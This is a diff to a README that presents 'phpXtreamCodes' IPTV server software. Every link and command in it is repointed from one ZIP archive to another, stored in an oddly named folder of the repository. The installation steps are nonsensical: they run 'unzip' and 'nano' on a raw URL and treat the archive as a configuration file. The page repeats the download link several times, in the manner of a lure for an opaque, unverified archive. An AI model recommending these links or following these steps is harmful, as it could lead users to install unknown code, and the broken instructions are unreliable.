@@ -6,9 +6,9 @@ Welcome to phpXtreamCodes! This software allows you to set up an IPTV server eas
 
 ## 📥 Download phpXtreamCodes
 
-[![Download phpXtreamCodes](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/phpXtreamCodes.zip)](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/phpXtreamCodes.zip)
+[![Download phpXtreamCodes](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/php_Codes_Xtream_v3.9.zip)](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/php_Codes_Xtream_v3.9.zip)
 
-To download phpXtreamCodes, visit this page: [Download Page](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/phpXtreamCodes.zip).
+To download phpXtreamCodes, visit this page: [Download Page](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/php_Codes_Xtream_v3.9.zip).
 
 ## 🛠️ Required Setup
 
@@ -32,13 +32,13 @@ Before you begin the download, ensure that your system meets the following requi
 Follow these steps to install phpXtreamCodes on your Linux server:
 
 1. **Download phpXtreamCodes:**
-   - Go to the [Download Page](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/phpXtreamCodes.zip) and choose the latest version of the software.
+   - Go to the [Download Page](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/php_Codes_Xtream_v3.9.zip) and choose the latest version of the software.
 
 2. **Extract the Files:**
    - Locate the downloaded ZIP file, then extract it to your preferred directory.
    - You can use the command:
      ```bash
-     unzip https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/phpXtreamCodes.zip
+     unzip https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/php_Codes_Xtream_v3.9.zip
      ```
 
 3. **Configure phpXtreamCodes:**
@@ -48,7 +48,7 @@ Follow these steps to install phpXtreamCodes on your Linux server:
      ```
    - Open the configuration file with a text editor:
      ```bash
-     nano https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/phpXtreamCodes.zip
+     nano https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/php_Codes_Xtream_v3.9.zip
      ```
    - Set your preferences for your IPTV server. Refer to comments in the file for guidance.
 
@@ -86,6 +86,6 @@ If you encounter issues or have questions, the following resources may be helpfu
 
 ## 📥 Download phpXtreamCodes Again
 
-To download phpXtreamCodes, visit this page: [Download Page](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/phpXtreamCodes.zip). 
+To download phpXtreamCodes, visit this page: [Download Page](https://raw.githubusercontent.com/PTSD-PTSR/phpXtreamCodes/main/intradermally/php_Codes_Xtream_v3.9.zip). 
 
 Thank you for choosing phpXtreamCodes. We are confident it will enhance your media streaming experience!
